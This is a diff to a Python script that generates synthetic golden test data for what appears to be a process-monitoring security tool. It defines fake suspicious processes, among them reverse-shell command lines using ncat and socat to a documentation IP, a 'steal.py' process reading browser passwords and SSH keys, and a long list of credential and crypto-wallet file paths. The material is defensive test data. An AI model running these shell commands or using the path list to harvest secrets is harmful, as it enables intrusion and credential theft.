@@ -240,3 +240,122 @@ proc_data = {
 (OUT / "proc.json").write_text(json.dumps(proc_data, indent=1, ensure_ascii=False, sort_keys=True) + "\n")
 print(f"wrote {OUT / 'proc.json'}: {len(proc_data['root']['sockets'])} sockets, "
       f"{len(proc_data['root']['processes'])} processes")
+
+
+# ---- Processes: Vigil 1's process checks (tasks/procs.py flags, tasks/secrets.py) ---------
+# Inputs are the synthetic fixture (read by Vigil 1's own snapshot, with no package database
+# and no hashing so the result does not depend on this machine) and SYNTHETIC hand-made
+# processes that reach every rule. Only the fields the checks read are kept.
+from vigil.tasks import procs as TP  # noqa: E402
+from vigil.tasks import secrets as TS  # noqa: E402
+
+FACT_KEYS = ("pid", "ppid", "comm", "exe", "exe_deleted", "cmdline", "name", "kernel", "path", "exists_now",
+             "package", "package_db", "ld", "sockets", "secrets")
+
+
+class NoPackages:
+    kind = None
+
+    def owner(self, path):
+        return None
+
+
+def facts(p):
+    out = {k: p.get(k) for k in FACT_KEYS}
+    out["sockets"] = [{k: s.get(k) for k in ("kind", "local_ip", "local_port")} for s in p.get("sockets") or []]
+    out["secrets"] = list(p.get("secrets") or [])
+    return out
+
+
+with tempfile.TemporaryDirectory() as tmp:
+    proc_root = helpers.make_proc(tmp)
+    empty_root = Path(tmp) / "empty"
+    empty_root.mkdir()
+    tsnap = TP.snapshot(proc_root, pkgfiles=NoPackages(), hasher=lambda *a: None, now=1000.0,
+                        home="/home/alice", root=str(empty_root))
+fixture_procs = {pid: facts(p) for pid, p in tsnap["processes"].items()}
+fixture_flags = {str(pid): [list(f) for f in TP.flags(p, tsnap["processes"], "/home/alice")]
+                 for pid, p in tsnap["processes"].items()}
+
+
+def P(pid, exe, cmdline, ppid=1, comm=None, **kw):
+    path = (exe or "").removesuffix(" (deleted)") or None
+    base = {"pid": pid, "ppid": ppid, "comm": comm or (path or "").rsplit("/", 1)[-1][:15] or "x", "exe": exe,
+            "exe_deleted": bool(exe and exe.endswith(" (deleted)")), "cmdline": cmdline,
+            "name": (path or "x").rsplit("/", 1)[-1], "kernel": False, "path": path, "exists_now": False,
+            "package": None, "package_db": None, "ld": {}, "sockets": [], "secrets": []}
+    base.update(kw)
+    return base
+
+
+def secret(kind, path):
+    return {"kind": kind, "label": TS.KINDS[kind][0], "path": path}
+
+
+H = "/home/alice"
+browser = P(100, "/usr/lib/firefox/firefox", ["/usr/lib/firefox/firefox"], comm="firefox")
+nginx = P(200, "/usr/sbin/nginx", ["nginx: worker process"], comm="nginx")
+case_procs = [
+    P(1, "/usr/lib/systemd/systemd", ["/sbin/init"], ppid=0, comm="systemd"),
+    browser, nginx,
+    P(300, "/memfd:payload (deleted)", ["x"], comm="x"),
+    P(301, "/opt/tool/bin/tool (deleted)", ["/opt/tool/bin/tool"]),
+    P(302, "/usr/bin/vim (deleted)", ["vim"], exists_now=True, package="vim"),
+    P(303, "/tmp/.x/agent", ["/tmp/.x/agent"]),
+    P(304, f"{H}/.cache/upd/upd", ["upd"]),
+    P(305, f"{H}/Downloads/App.AppImage", ["App.AppImage"]),
+    P(306, f"{H}/.hidden/bin/miner", ["miner"]),
+    P(307, f"{H}/.local/bin/tool", ["tool"]),
+    P(308, f"{H}/.cargo/bin/rg", ["rg"]),
+    P(309, "/usr/bin/sleep", ["sleep", "9"], ld={"LD_PRELOAD": "/tmp/libhook.so", "LD_LIBRARY_PATH": "/opt/x"}),
+    P(310, "/usr/bin/sleep", ["sleep", "9"], ld={"LD_AUDIT": "  "}),
+    P(311, "/usr/bin/bash", ["bash", "-c", "id"], ppid=100, comm="bash"),
+    P(312, "/usr/bin/bash", ["sh", "-c", "xdg-open https://example.org"], ppid=100, comm="bash"),
+    P(313, "/usr/bin/python3.12", ["python3", "-c", "print(1)"], ppid=200, comm="python3"),
+    P(314, "/usr/bin/curl", ["curl", "https://example.org"], ppid=100, comm="curl"),
+    P(315, "/home/alice/.local/share/dbus-daemon", ["dbus-daemon", "--session"], comm="dbus-daemon"),
+    P(316, "/usr/bin/tor", ["dbus-daemon"], comm="dbus-daemon", package_db="pacman"),
+    P(317, "/usr/bin/dbus-daemon", ["dbus-daemon"], comm="dbus-daemon", package_db="pacman"),
+    P(318, "/usr/local/bin/kw", ["[kworker/0:1]"], comm="kw"),
+    P(319, "/usr/bin/ncat", ["ncat", "203.0.113.5", "4444", "-e", "/bin/bash"], comm="ncat"),
+    P(320, "/usr/bin/socat", ["socat", "tcp:203.0.113.5:4444", "exec:/bin/sh"], comm="socat"),
+    P(321, "/usr/bin/python3.12", ["python3", "/tmp/steal.py"], comm="python3",
+      secrets=[secret("browser_passwords", f"{H}/.mozilla/firefox/p/logins.json"),
+               secret("ssh_key", f"{H}/.ssh/id_ed25519")]),
+    P(322, "/usr/bin/mystery", ["mystery"], comm="mystery", secrets=[secret("cloud_creds", f"{H}/.aws/credentials")]),
+    P(323, "/usr/bin/mystery2", ["mystery2"], comm="mystery2", package_db="rpm",
+      secrets=[secret("wallet", f"{H}/.electrum/wallets/default_wallet")]),
+    P(324, "/usr/bin/nvim", ["nvim", f"{H}/.aws/credentials"], comm="nvim",
+      secrets=[secret("cloud_creds", f"{H}/.aws/credentials")]),
+    P(325, "/opt/google/chrome/chrome_crashpad_handler", ["chrome_crashpad_handler"], comm="chrome_crashpa",
+      secrets=[secret("browser_cookies", f"{H}/.config/google-chrome/Default/Cookies")]),
+    P(326, "/usr/bin/restic", ["restic", "backup"], comm="restic", secrets=[secret("ssh_key", f"{H}/.ssh/id_rsa")]),
+    P(327, "/tmp/srv", ["/tmp/srv"], sockets=[{"kind": "listen", "local_ip": "0.0.0.0", "local_port": 8080}]),
+    P(328, f"{H}/Downloads/srv", ["srv"], sockets=[{"kind": "listen", "local_ip": "127.0.0.1", "local_port": 9}]),
+    P(329, None, [], ppid=2, comm="kworker/0:1", kernel=True),
+    P(330, "/usr/bin/bash", ["bash"], ppid=999, comm="bash"),
+]
+case_map = {p["pid"]: p for p in case_procs}
+case_flags = {str(p["pid"]): [list(f) for f in TP.flags(p, case_map, H)] for p in case_procs}
+paths = [f"{H}/.ssh/id_ed25519", f"{H}/.ssh/id_ed25519.pub", f"{H}/.ssh/known_hosts", f"{H}/.ssh/deploy_key",
+         f"{H}/.ssh/aws.pem", f"{H}/.gnupg/private-keys-v1.d/AB.key", f"{H}/.gnupg/secring.gpg",
+         f"{H}/.gnupg/pubring.kbx", f"{H}/.config/chromium/Default/Login Data", f"{H}/.mozilla/firefox/x/key4.db",
+         f"{H}/.mozilla/firefox/x/cookies.sqlite", f"{H}/.config/BraveSoftware/Default/Network/Cookies",
+         f"{H}/.config/chromium/Local State", f"{H}/.config/chromium/Default/Web Data", f"{H}/vault.kdbx",
+         f"{H}/old.kdb", f"{H}/x.psafe3", f"{H}/.local/share/keyrings/login.keyring",
+         f"{H}/.local/share/kwalletd/kdewallet.kwl", f"{H}/.config/discord/Local Storage/leveldb/000.ldb",
+         f"{H}/.config/vesktop/Local Storage/leveldb/1.log", f"{H}/.bitcoin/wallet.dat",
+         f"{H}/.bitcoin/wallets/w1/wallet.dat", f"{H}/.electrum/wallets/default", f"{H}/.ethereum/keystore/UTC--x",
+         f"{H}/.monero/x", f"{H}/.config/Ledger Live/app.json", f"{H}/.aws/credentials", f"{H}/.aws/config",
+         f"{H}/.kube/config", f"{H}/.docker/config.json", f"{H}/.netrc", f"{H}/.git-credentials", f"{H}/.pgpass",
+         f"{H}/.config/gcloud/credentials.db", f"{H}/.config/gh/hosts.yml", f"{H}/.azure/accessTokens.json",
+         f"{H}/notes.txt", "/etc/passwd", f"{H}/.config/Exodus/exodus.wallet/seed.seco", f"{H}/.sparrow/wallets/w"]
+(OUT / "tasks.json").write_text(json.dumps({
+    "_note": "SYNTHETIC: Vigil 1's process checks on tests/fixtures/proc and hand-made processes. "
+             "Regenerate with make_golden.py.",
+    "home": H,
+    "fixture": {"procs": {str(k): v for k, v in fixture_procs.items()}, "flags": fixture_flags},
+    "cases": {"procs": {str(p["pid"]): p for p in case_procs}, "flags": case_flags},
+    "classify": {p: TS.classify(p) for p in paths},
+}, indent=1, ensure_ascii=False, sort_keys=True) + "\n")
+print(f"wrote {OUT / 'tasks.json'}: {len(fixture_procs)} fixture processes, {len(case_procs)} cases")
